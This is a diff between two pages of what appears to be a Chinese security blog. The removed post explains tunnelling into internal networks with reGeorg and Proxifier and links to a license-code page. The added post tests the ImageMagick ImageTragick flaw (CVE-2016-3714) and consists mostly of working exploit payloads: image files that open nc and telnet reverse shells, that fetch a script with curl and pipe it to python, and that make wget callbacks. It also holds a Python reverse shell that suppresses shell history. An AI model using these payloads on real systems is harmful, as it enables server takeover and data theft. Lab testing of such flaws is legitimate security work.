@@ -64,7 +64,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="内网," />
+  <meta name="keywords" content="poc," />
 
 
 
@@ -80,27 +80,21 @@
 
 
 
-<meta name="description" content="1. 首先我们需要明白正向代理和反向代理的区别1.1 正向代理(Forward Proxy)
-1Lhost－－&amp;gt;proxy－－&amp;gt;Rhost
-&amp;emsp;&amp;emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。">
+<meta name="description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透之socks5代理（reGeorg+proxifier详细配置说明）">
-<meta property="og:url" content="http://yoursite.com/2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/index.html">
+<meta property="og:title" content="ImageMagick 漏洞测试">
+<meta property="og:url" content="http://yoursite.com/2016/05/10/ImageMagick漏洞测试/index.html">
 <meta property="og:site_name" content="wps2015的博客">
-<meta property="og:description" content="1. 首先我们需要明白正向代理和反向代理的区别1.1 正向代理(Forward Proxy)
-1Lhost－－&amp;gt;proxy－－&amp;gt;Rhost
-&amp;emsp;&amp;emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。">
-<meta property="og:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2jKQ4mVXXXXbfXpXXXXXXXXXX_!!792076116.png">
-<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2nSXwnXXXXXXdXXXXXXXXXXXX_!!792076116.png">
-<meta property="og:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2Xfw2mVXXXXbJXpXXXXXXXXXX_!!792076116.png">
-<meta property="og:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2hdljnXXXXXclXXXXXXXXXXXX_!!792076116.png">
-<meta property="og:updated_time" content="2016-04-13T07:52:03.436Z">
+<meta property="og:description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2UKp5oFXXXXbIXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2v4GmoFXXXXb7XXXXXXXXXXXX_!!792076116.png">
+<meta property="og:image" content="https://img.alicdn.com/imgextra/i2/792076116/TB2qROpoFXXXXblXpXXXXXXXXXX_!!792076116.png">
+<meta property="og:updated_time" content="2016-05-10T01:44:15.595Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网渗透之socks5代理（reGeorg+proxifier详细配置说明）">
-<meta name="twitter:description" content="1. 首先我们需要明白正向代理和反向代理的区别1.1 正向代理(Forward Proxy)
-1Lhost－－&amp;gt;proxy－－&amp;gt;Rhost
-&amp;emsp;&amp;emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。">
-<meta name="twitter:image" content="https://img.alicdn.com/imgextra/i4/792076116/TB2jKQ4mVXXXXbfXpXXXXXXXXXX_!!792076116.png">
+<meta name="twitter:title" content="ImageMagick 漏洞测试">
+<meta name="twitter:description" content="&amp;emsp;&amp;emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。">
+<meta name="twitter:image" content="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png">
 
 
 
@@ -118,7 +112,7 @@
   };
 </script>
 
-  <title> 内网渗透之socks5代理（reGeorg+proxifier详细配置说明） | wps2015的博客 </title>
+  <title> ImageMagick 漏洞测试 | wps2015的博客 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -258,7 +252,7 @@
             
             
               
-                内网渗透之socks5代理（reGeorg+proxifier详细配置说明）
+                ImageMagick 漏洞测试
               
             
           </h1>
@@ -270,38 +264,19 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-03-02T16:48:10+08:00" content="2016-03-02">
-              2016-03-02
+            <time itemprop="dateCreated" datetime="2016-05-10T09:43:30+08:00" content="2016-05-10">
+              2016-05-10
             </time>
           </span>
 
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/工具使用/" itemprop="url" rel="index">
-                    <span itemprop="name">工具使用</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
           
 
           
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/" itemprop="commentsCount"></span>
+                <a href="/2016/05/10/ImageMagick漏洞测试/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/05/10/ImageMagick漏洞测试/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -324,29 +299,15 @@
       
 
       
-        <h3 id="1-首先我们需要明白正向代理和反向代理的区别"><a href="#1-首先我们需要明白正向代理和反向代理的区别" class="headerlink" title="1. 首先我们需要明白正向代理和反向代理的区别"></a>1. 首先我们需要明白正向代理和反向代理的区别</h3><p><strong>1.1 正向代理(Forward Proxy)</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost－－&gt;proxy－－&gt;Rhost</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。<a id="more"></a></p>
-<p><strong>1.2 反向代理（reverse proxy</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lhost&lt;－－&gt;proxy&lt;－－&gt;firewall&lt;－－&gt;Rhost</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</p>
-<p>&emsp;&emsp;而我们平常使用的reDuh、tunna，和reGeorg一样，都是正向代理。一般都是用户上传一个代理脚本到服务器端，本地的程序去连接服务器上的脚本，脚本程序做代理转发端口和流量。</p>
-<h3 id="2-工具介绍"><a href="#2-工具介绍" class="headerlink" title="2. 工具介绍"></a>2. 工具介绍</h3><p><strong>2.1 reGeorg</strong><br>&emsp;&emsp;reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高。</p>
-<p>&emsp;&emsp;reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">下载</a></p>
-<p><strong>2.2 proxifier</strong></p>
-<p>&emsp;&emsp;Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
-<p>&emsp;&emsp;下载地址：<a href="https://www.proxifier.com/" target="_blank" rel="external">下载</a></p>
-<p>&emsp;&emsp;激活码：  <a href="http://wenku.baidu.com/link?url=T9od33JuA7jjxzfyV-wOjsYyARbVXwuXs2GwWwXLkX6vxRU4Rj0p_e2_0l1A0-WT9NOs3sh1OqDbYBgFYXLyjfconba4FF4iqdoz-tV5GH_" target="_blank" rel="external">查看</a></p>
-<h3 id="3-工具配置"><a href="#3-工具配置" class="headerlink" title="3. 工具配置"></a>3. 工具配置</h3><p>&emsp;&emsp;先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</p>
-<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2jKQ4mVXXXXbfXpXXXXXXXXXX_!!792076116.png" alt="clipboard"></p>
-<p>&emsp;&emsp;运行py程序：<code>python reGeorgSocksProxy.py -p 8888 -u http:www.exemple.com/test/tunnel.jsp</code></p>
-<p>&emsp;&emsp;将proxifier打开，在Proxy Server中这样配置</p>
-<p><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2nSXwnXXXXXXdXXXXXXXXXXXX_!!792076116.png" alt="clipboard (2)"></p>
-<p>&emsp;&emsp;然后在远程桌面程序上右键，以Proxifier选择“Proxy SOCKS5 127.0.0.1”打开。ipconfig查询内网机器的ip</p>
-<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2Xfw2mVXXXXbJXpXXXXXXXXXX_!!792076116.png" alt="clipboard (3)"></p>
-<p>&emsp;&emsp;直接在远程连接上输入内网机器的内网ip</p>
-<p><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2hdljnXXXXXclXXXXXXXXXXXX_!!792076116.png" alt="clipboard (4)"></p>
-<p>&emsp;&emsp;点击连接即可。</p>
+        <p>&emsp;&emsp;5月3日，图像处理软件ImageMagick就被公布出一个严重的0day漏洞(CVE-2016-3714)，攻击者通过此漏洞可执行任意命令，最终窃取重要信息取得服务器控制权。<a id="more"></a>由此漏洞延伸，ImageMagick被许多编程语言所支持，包括Perl，C++，PHP（通过imagick拓展），Python和Ruby等，并被部署在数以百万计的网站，博客，社交媒体平台和流行的内容管理系统(CMS)，例如WordPress和Drupal。<br>&emsp;&emsp;利用这个漏洞，可以通过上传一张含有恶意代码的图片，可导致命令执行。这里我们主要讲的是如何测试漏洞，可以写文件、反弹shell、wget等。本地搭建一个测试环境，在kali2.0中，lamp环境下，安装了php的imagick扩展，调用ImageMagick进行上传的图片处理<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]&gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $dest_file = <span class="string">"./images/"</span>.md5(uniqid(rand())).<span class="string">".png"</span>;</span><br><span class="line">    $thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">    $thumb-&gt;readImage($temp_file);</span><br><span class="line">    $thumb-&gt;writeImage($dest_file);</span><br><span class="line">    $thumb-&gt;clear();</span><br><span class="line">    $thumb-&gt;destroy();</span><br><span class="line">    unlink($temp_file);</span><br><span class="line">    <span class="keyword">echo</span> $dest_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>1. netcat</strong><br>前提是server服务器上安装了netcat，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|nc xxx.xxx.xxx.xxx 2015 -e /bin/bash&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 2015</span><br></pre></td></tr></table></figure></p>
+<p>测试处，点击上传后<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2tD8LoFXXXXbNXFXXXXXXXXXX_!!792076116.png" alt=""><br><strong>2. telnet</strong><br>telnet在linux的各大发行版中telnet一般默认安装，poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|telnet x.x.x.x 2015&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>在反弹的监听主机上监听，指令同上<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2UKp5oFXXXXbIXpXXXXXXXXXX_!!792076116.png" alt=""><br><strong>3. curl&amp;python</strong><br>利用curl下载python文件后，执行python脚本反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://1&quot;||curl -sS http://x.x.x.x/test.py | python&quot;)&apos;</span><br><span class="line">pop graphic-contex</span><br></pre></td></tr></table></figure></p>
+<p>这里需要一个外网服务器存放你的脚本,python脚本内容如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,socket,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2015</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);os.unsetenv(<span class="string">"HISTFILE"</span>);os.unsetenv(<span class="string">"HISTFILESIZE"</span>);os.unsetenv(<span class="string">"HISTSIZE"</span>);os.unsetenv(<span class="string">"HISTORY"</span>);os.unsetenv(<span class="string">"HISTSAVE"</span>);os.unsetenv(<span class="string">"HISTZONE"</span>);os.unsetenv(<span class="string">"HISTLOG"</span>);os.unsetenv(<span class="string">"HISTCMD"</span>);os.putenv(<span class="string">"HISTFILE"</span>,<span class="string">"/dev/null"</span>);os.putenv(<span class="string">"HISTSIZE"</span>,<span class="string">"0"</span>);os.putenv(<span class="string">"HISTFILESIZE"</span>,<span class="string">"0"</span>);pty.spawn(<span class="string">"/bin/sh"</span>);s.close()</span><br></pre></td></tr></table></figure></p>
+<p>注意更改脚本里的反弹ip和端口，测试成功<br><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2v4GmoFXXXXb7XXXXXXXXXXXX_!!792076116.png" alt=""><br><strong>4. wget</strong><br>在远程服务上写个php脚本记录访问ip，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">file_put_contents(<span class="string">"log.txt"</span>, <span class="string">"ping from "</span>.$ip, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>poc如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &apos;url(https://example.com/image.jpg&quot;|wget http://x.x.x.x/img.php&quot;)&apos;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure></p>
+<p>命令执行成功，则在log.txt中会记录来访ip<br><img src="https://img.alicdn.com/imgextra/i2/792076116/TB2qROpoFXXXXblXpXXXXXXXXXX_!!792076116.png" alt=""></p>
 
       
     </div>
@@ -367,7 +328,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/内网/" rel="tag">#内网</a>
+            <a href="/tags/poc/" rel="tag">#poc</a>
           
         </div>
       
@@ -376,17 +337,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/09/29/关于服务器的host绑定的不安全因素/" rel="next" title="关于服务器的host绑定的不安全因素">
-                <i class="fa fa-chevron-left"></i> 关于服务器的host绑定的不安全因素
+              <a href="/2016/03/07/浅谈企业网络边界/" rel="next" title="浅谈企业网络边界">
+                <i class="fa fa-chevron-left"></i> 浅谈企业网络边界
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/03/07/浅谈企业网络边界/" rel="prev" title="浅谈企业网络边界">
-                浅谈企业网络边界 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -412,8 +369,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/"
-           data-title="内网渗透之socks5代理（reGeorg+proxifier详细配置说明）" data-url="http://yoursite.com/2016/03/02/内网渗透之socks5代理（reGeorg+proxifier详细配置说明）/">
+      <div class="ds-thread" data-thread-key="2016/05/10/ImageMagick漏洞测试/"
+           data-title="ImageMagick 漏洞测试" data-url="http://yoursite.com/2016/05/10/ImageMagick漏洞测试/">
       </div>
     
   </div>
@@ -559,7 +516,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-首先我们需要明白正向代理和反向代理的区别"><span class="nav-number">1.</span> <span class="nav-text">1. 首先我们需要明白正向代理和反向代理的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-工具介绍"><span class="nav-number">2.</span> <span class="nav-text">2. 工具介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-工具配置"><span class="nav-number">3.</span> <span class="nav-text">3. 工具配置</span></a></li></ol></div>
+              <p class="post-toc-empty">此文章未包含目录</p>
             
           </div>
         </section>
